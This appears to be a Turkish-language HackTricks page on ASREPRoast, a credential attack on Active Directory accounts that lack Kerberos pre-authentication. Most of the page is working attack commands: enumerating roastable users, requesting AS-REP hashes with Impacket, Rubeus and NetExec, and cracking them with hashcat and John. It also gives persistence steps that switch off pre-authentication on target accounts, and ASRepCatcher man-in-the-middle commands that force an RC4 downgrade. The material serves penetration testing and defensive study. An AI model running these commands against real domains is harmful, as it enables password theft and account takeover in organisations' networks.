# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast, **Kerberos pre-authentication required attribute** özelliği olmayan kullanıcıları istismar eden bir güvenlik saldırısıdır. Temel olarak bu zafiyet, saldırganların kullanıcı parolası olmadan Domain Controller (DC) üzerinden bir kullanıcı için authentication istemesine izin verir. DC daha sonra kullanıcının parolasından türetilmiş anahtarla şifrelenmiş bir mesajla yanıt verir; saldırganlar bu mesajı offline olarak crack etmeye çalışarak kullanıcının parolasını keşfedebilir.

Bu saldırı için temel gereksinimler şunlardır:

- **Kerberos pre-authentication eksikliği**: Hedef kullanıcılar bu güvenlik özelliğini etkinleştirmemiş olmalıdır.
- **Domain Controller (DC) bağlantısı**: Saldırganların istek göndermek ve şifrelenmiş mesajları almak için DC'ye erişimi olmalıdır.
- **Opsiyonel domain account**: Bir domain account'a sahip olmak, saldırganların LDAP sorguları aracılığıyla vulnerable kullanıcıları daha verimli şekilde belirlemesini sağlar. Böyle bir account olmadan, saldırganlar username tahmin etmek zorundadır.

#### Vulnerable kullanıcıları enumerate etme (domain credentials gerekir)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP iletisi isteği
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus varsayılan olarak **RC4** ister, bu yüzden Event ID **4768** genelde **preauth type 0** ve **ticket encryption type 0x17** gösterir. Eğer **`/aes`** eklerseniz (veya hedef için RC4 devre dışıysa), bunun yerine **AES etypes** bekleyin.

#### Quick one-liners (Linux)

- Olası hedefleri önce enumerate edin (örn. sızdırılmış build path'lerinden) Kerberos userenum ile: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Geçerli creds olmadan tüm bir username listesini roast etmek için NetExec kullanın: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- Eğer creds'iniz varsa, NetExec'in LDAP sorgulaması yapmasına ve roast edilebilir tüm hesapları sizin için istemesine izin verin: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- Output **`$krb5asrep$23$`** ile başlıyorsa, Hashcat **`-m 18200`** ile crack edin. **`$krb5asrep$17$`** veya **`$krb5asrep$18$`** ile başlıyorsa, John **`--format=krb5asrep`** kullanın.

### Cracking

Her AS-REP roast'un RC4 olduğunu varsaymayın. Modern tooling, istenen/anlaşılan enctype'a bağlı olarak **RC4** (`$krb5asrep$23$`) veya **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) döndürebilir. **`hashcat -m 18200`** **etype 23** içindir, **John** ise **17/18/23** için `krb5asrep`'i doğrudan destekler.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

**GenericAll** izinlerine sahip olduğunuz bir kullanıcı için **preauth** gerekmez hale zorlayın (veya özellikleri yazma izinleri):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast kimlik bilgileri olmadan

Bir saldırgan, Kerberos pre-authentication devre dışı bırakılmasına güvenmeden ağdan geçerken AS-REP paketlerini yakalamak için man-in-the-middle konumunu kullanabilir. Bu nedenle VLAN üzerindeki tüm kullanıcılar için çalışır.\
İlgili, bir no-preauth principal’dan **TGT** yerine **service ticket** döndüren kimlik bilgisi gerektirmeyen hileyi istiyorsanız, [Kerberoast](kerberoast.md) bölümüne bakın.

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) bunu yapmamıza izin verir. `relay` modu saldırı açısından ilginç olanıdır çünkü istemci hâlâ **etype 23** ilan ederken **RC4** zorlayabilir; `listen` ise pasif kalır ve yalnızca istemci/DC’nin üzerinde anlaştığı şeyi yakalar.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referanslar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
